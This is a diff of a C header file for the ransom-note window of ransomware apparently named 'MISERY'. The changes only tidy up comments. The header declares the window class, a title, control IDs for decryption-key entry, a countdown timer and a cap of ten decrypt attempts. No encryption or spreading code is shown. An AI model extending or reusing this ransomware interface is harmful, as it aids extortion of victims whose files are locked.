@@ -32,15 +32,12 @@
 #define CLR_BTN_RED_HOVER    RGB(220,  80,  80)
 #define CLR_BTN_RED_PRESS    RGB(150,  40,  40)
 
-/* ------------------------------------------------------------------ */
+
 /* Class / window identifiers                                         */
-/* ------------------------------------------------------------------ */
 #define WC_RANSOM   L"MiseryRansomNote"
 #define WIN_TITLE   L"MISERY - Security Event"
 
-/* ------------------------------------------------------------------ */
-/* Control IDs                                                        */
-/* ------------------------------------------------------------------ */
+//control id's
 #define IDC_CLOSE        1001
 #define IDC_DECRYPT_KEY  1002
 #define IDC_DECRYPT_BTN  1003
@@ -48,33 +45,29 @@
 #define IDC_TIMER        1005
 #define IDC_ATTEMPTS     1006
 
-/* Banner/card/decorative panel IDs (for WM_CTLCOLORSTATIC ID matching) */
+/* Banner/card/decorative panel IDs */
 #define IDC_BANNER_BG     2001
 #define IDC_CARD_BG       2002
 #define IDC_DECRYPT_PANEL 2003
 #define IDC_CARD_BAR      2004
 
-/* ------------------------------------------------------------------ */
-/* Custom window messages                                             */
-/* ------------------------------------------------------------------ */
+
+// Custom window messages                                       
+
 #define WM_DECRYPT_DONE (WM_APP + 1)
 
-/* ------------------------------------------------------------------ */
-/* Limits                                                             */
-/* ------------------------------------------------------------------ */
+// Limits      
 #define MAX_DECRYPT_ATTEMPTS 10
 
-/* ------------------------------------------------------------------ */
+
 /* Decrypt thread parameter                                           */
-/* ------------------------------------------------------------------ */
 typedef struct {
     char  key[256];
     HWND  hWnd;
 } DECRYPT_THREAD_PARAMS;
 
-/* ------------------------------------------------------------------ */
-/* Extern GDI resources — defined in gui_resources.c                   */
-/* ------------------------------------------------------------------ */
+
+// Extern GDI resources
 extern HBRUSH  g_hbrBanner;
 extern HBRUSH  g_hbrBg;
 extern HBRUSH  g_hbrCard;
@@ -91,9 +84,8 @@ extern HFONT   g_hFontMono;
 extern HFONT   g_hFontName;
 extern HFONT   g_hFontTimer;
 
-/* ------------------------------------------------------------------ */
-/* Extern state variables — defined in gui_utils.c                    */
-/* ------------------------------------------------------------------ */
+
+// Extern state variables/
 extern ULONGLONG g_timerEndFileTime;
 extern int       g_decryptAttempts;
 extern WNDPROC   g_OldKeyEditProc;
